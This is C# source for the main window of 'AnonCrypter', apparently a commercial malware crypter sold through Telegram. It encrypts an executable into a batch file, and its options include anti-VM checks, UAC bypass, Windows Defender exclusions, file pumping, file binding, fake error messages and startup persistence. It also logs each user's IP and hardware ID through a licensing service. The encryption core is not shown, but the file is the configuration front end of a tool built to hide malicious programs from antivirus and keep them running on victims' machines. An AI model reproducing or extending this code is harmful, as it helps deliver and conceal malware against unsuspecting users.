using AnonCrypter.Auth;
using AnonCrypter.Crypter;
using AnonCrypter.Settings;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AnonCrypter.Forms
{
    public partial class FormMain : Form
    {
        public static bool readOnly = Security.AntiDebug.secBool;
        private readonly Crypter.Crypter _crypter;
        private readonly CrypterOptions _options;

        public FormMain()
        {
            _options = new CrypterOptions();
            _crypter = new Crypter.Crypter();
            Settings.Settings settings = Settings.Settings.Load();

            //if (settings != null)
            //{
            //    try
            //    {
            //        this.UnpackSettings(settings);
            //    }
            //    catch
            //    {
            //    }
            //}
            //else
            //{ 
            //    Process.Start("https://t.me/mranontools");
            //    Process.Start("https://t.me/batchcrypter");
            //}

            if (SaveLogin.CheckLicenseKeyExists())
            {
                if (!LoadAuth.licenseFunction(SaveLogin.ReadLicenseKey(), true))
                {

                }
                else
                {
                    Program.KeyAuthApp.log(Program.KeyAuthApp.user_data.ip + " " + Program.KeyAuthApp.user_data.hwid + " Automatically Logged in with the username " + keyTxt.Text);
                    mainPages.SetPage(pageCrypter);
                }
            }

            InitializeComponent();
            Program.KeyAuthApp.loadLogin();
            execMethod.SelectedItem = null;
            execMethod.SelectedIndex = 0;
        }

        private Settings.Settings PackSettings()
        {
            this.UpdateOptions();
            return new Settings.Settings()
            {
                InputFile = this.input.Text,
                PumpFile = this.pumpFile.Checked,
                PumpFileAmount = this.pumpFile.Checked ? (int)this.pumpFileInput.Value : 0,
                CrypterOptions = this._options
            };
        }

        private void UpdateOptions()
        {
            this._options.DropFile = this.execMethod.SelectedIndex == 1;
            this._options.AntiVM = this.antiVM.Checked;
            this._options.SingleInstance = this.singleInstance.Checked;
            this._options.Delay = this.delay.Checked ? (int)this.delayInput.Value : 0;
            this._options.BotKiller = this.botKiller.Checked;
            this._options.FakeError = this.fakeError.Checked ? this.fakeErrorText.Text : (string)null;
            this._options.UACBypass = this.uacBypass.Checked;
            this._options.WDExclusions = this.wdExclusions.Checked;
            this._options.BindedFiles = this.binder.Checked ? this.binderListBox.Items.Cast<string>().ToArray<string>() : new string[0];
            this._options.Startup = this.startup.Checked;
            this._options.Startup_MeltFile = this.startupMelt.Checked;
            this._options.Startup_BF = this.startupBF.Checked;
            this._options.Startup_FE = this.startupFE.Checked;
        }

        private void UnpackSettings(Settings.Settings obj)
        {
            this.input.Text = obj.InputFile;
            this.pumpFile.Checked = obj.PumpFile;
            this.pumpFileInput.Value = (Decimal)obj.PumpFileAmount;
            this.execMethod.SelectedIndex = obj.CrypterOptions.DropFile ? 1 : 0;
            this.antiVM.Checked = obj.CrypterOptions.AntiVM;
            this.singleInstance.Checked = obj.CrypterOptions.SingleInstance;
            this.delay.Checked = obj.CrypterOptions.Delay != 0;
            this.botKiller.Checked = obj.CrypterOptions.BotKiller;
            this.fakeError.Checked = !string.IsNullOrEmpty(obj.CrypterOptions.FakeError);
            this.delayInput.Value = (Decimal)obj.CrypterOptions.Delay;
            this.fakeErrorText.Text = obj.CrypterOptions.FakeError;
            this.wdExclusions.Checked = obj.CrypterOptions.WDExclusions;
            this.uacBypass.Checked = obj.CrypterOptions.UACBypass;
            this.startup.Checked = obj.CrypterOptions.Startup;
            this.startupMelt.Checked = obj.CrypterOptions.Startup_MeltFile;
            this.startupBF.Checked = obj.CrypterOptions.Startup_BF;
            this.startupFE.Checked = obj.CrypterOptions.Startup_FE;
            this.binder.Checked = obj.CrypterOptions.BindedFiles.Length != 0;
            this.binderListBox.Items.AddRange((object[])obj.CrypterOptions.BindedFiles);
        }

        private void passwordTxt_IconRightClick(object sender, EventArgs e)
        {
            if (passwordTxt.UseSystemPasswordChar)
            {
                passwordTxt.UseSystemPasswordChar = false;
                passwordTxt.PasswordChar = '\0';
                passwordTxt.Update();
            }
            else
            {
                passwordTxt.UseSystemPasswordChar = true;
                passwordTxt.Update();
            }
        }

        private void closeBtn_Click(object sender, EventArgs e)
        {
            Settings.Settings.Save(this.PackSettings());
            Environment.Exit(200);
        }

        private void loginBtn_Click(object sender, EventArgs e)
        {
            if (!LoadAuth.licenseFunction(keyTxt.Text, false))
            {
                
            }
            else
            {
                Program.KeyAuthApp.log(Program.KeyAuthApp.user_data.ip + " " + Program.KeyAuthApp.user_data.hwid + " Logged in with the username " + keyTxt.Text);
                SaveLogin.WriteLicenseKey(keyTxt.Text);
                mainPages.SetPage(pageCrypter);
            }
        }

        private void crypterCloseBtn_Click(object sender, EventArgs e)
        {
            Settings.Settings.Save(this.PackSettings());
            Environment.Exit(200);
        }

        private void homeBtn_Click(object sender, EventArgs e)
        {
            crypterPages.SetPage(crypterHome);
        }

        private void optionsBtn_Click(object sender, EventArgs e)
        {
            crypterPages.SetPage(crypterOptions);
        }

        private void installationBtn_Click(object sender, EventArgs e)
        {
            crypterPages.SetPage(crypterInstallation);
        }

        private void buildBtn_Click(object sender, EventArgs e)
        {
            crypterPages.SetPage(crypterBuild);
        }

        private void pumpFile_CheckedChanged(object sender, EventArgs e)
        {
            if (!pumpFile.Checked)
            {
                pumpFileInput.Enabled = false;
            }
            else
            {
                pumpFileInput.Enabled = true;
            }
        }

        private void delay_CheckedChanged(object sender, EventArgs e)
        {
            if (!delay.Checked)
            {
                delayInput.Enabled = false;
            }
            else
            {
                delayInput.Enabled = true;
            }
        }

        private void fakeError_CheckedChanged(object sender, EventArgs e)
        {
            if (!fakeError.Checked)
            {
                fakeErrorText.Enabled = false;
            }
            else
            {
                fakeErrorText.Enabled = true;
            }
        }

        private void binderListBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (binderListBox.Items.Count > 0)
            {
                binderListBox.ForeColor = Color.FromArgb(255, 255, 255);
            }
            else
            {
                binderListBox.ForeColor = Color.FromArgb(7, 11, 41);
            }
        }

        private void binder_CheckedChanged(object sender, EventArgs e)
        {
            if (!binder.Checked)
            {
                binderListBox.Enabled = false;
                addFile.Enabled = false;
                removeFile.Enabled = false;
            }
            else
            {
                binderListBox.Enabled = true;
                addFile.Enabled = true;
                removeFile.Enabled = true;
            }
        }

        private void openFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.RestoreDirectory = true;
            openFileDialog1.Title = "Open File";
            openFileDialog1.Filter = "Executable file (*.exe)|*.exe";
            using (OpenFileDialog openFileDialog2 = openFileDialog1)
            {
                if (openFileDialog2.ShowDialog() != DialogResult.OK)
                    return;
                this.input.Text = openFileDialog2.FileName;
            }
        }

        private void addFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.RestoreDirectory = true;
            openFileDialog1.Title = "Open File";
            using (OpenFileDialog openFileDialog2 = openFileDialog1)
            {
                if (openFileDialog2.ShowDialog() != DialogResult.OK)
                    return;
                this.binderListBox.Items.Add((object)openFileDialog2.FileName);
            }
        }

        private void removeFile_Click(object sender, EventArgs e) => this.binderListBox.Items.RemoveAt(this.binderListBox.SelectedIndex);

        private void build_Click(object sender, EventArgs e)
        {
            this.Enabled = false;
            try
            {
                if (!File.Exists(this.input.Text))
                {
                    int num1 = (int)MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    if (this.execMethod.SelectedIndex == 1 && !this.wdExclusions.Checked && MessageBox.Show("It is not recommended to use 'Drop to disk' without 'Win.Def exclusion'. Are you sure you want to continue?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
                        return;
                    SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                    saveFileDialog1.FileName = Path.ChangeExtension(this.input.Text, (string)null) + "_MrAnon";
                    saveFileDialog1.Filter = "Batch file (*.cmd)|*.cmd|Batch file (*.bat)|*.bat";
                    saveFileDialog1.AddExtension = true;
                    saveFileDialog1.Title = "Save File";
                    saveFileDialog1.RestoreDirectory = true;
                    using (SaveFileDialog saveFileDialog2 = saveFileDialog1)
                    {
                        if (saveFileDialog2.ShowDialog() != DialogResult.OK)
                        {
                            int num2 = (int)MessageBox.Show("Build canceled.", "Status", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        }
                        else
                        {
                            FileType fileType = this._crypter.GetFileType(this.input.Text);
                            if (fileType == FileType.Invalid)
                            {
                                int num3 = (int)MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                            }
                            else
                            {
                                this.UpdateOptions();
                                using (Aes aes = Aes.Create())
                                {
                                    this._crypter.Key = aes.Key;
                                    this._crypter.IV = aes.IV;
                                }
                                byte[] bytes = this._crypter.Process(File.ReadAllBytes(this.input.Text), fileType, this._options);
                                File.WriteAllBytes(saveFileDialog2.FileName, bytes);
                                if (this.pumpFile.Checked)
                                    Utils.PumpFile(saveFileDialog2.FileName, (int)this.pumpFileInput.Value);
                                int num4 = (int)MessageBox.Show("Build successful!", "Status", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                                Program.KeyAuthApp.log(Program.KeyAuthApp.user_data.ip + " " + Program.KeyAuthApp.user_data.hwid + " " + keyTxt.Text + " Has built the file with filename " + input.Text);
                            }
                        }
                    }
                }
            }
            finally
            {
                this.Enabled = true;
            }
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/Mranontools");
        }

        private void guna2PictureBox2_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/Mranon666");
        }

        private void guna2PictureBox3_Click(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void crypterBuild_Click(object sender, EventArgs e)
        {

        }
    }
}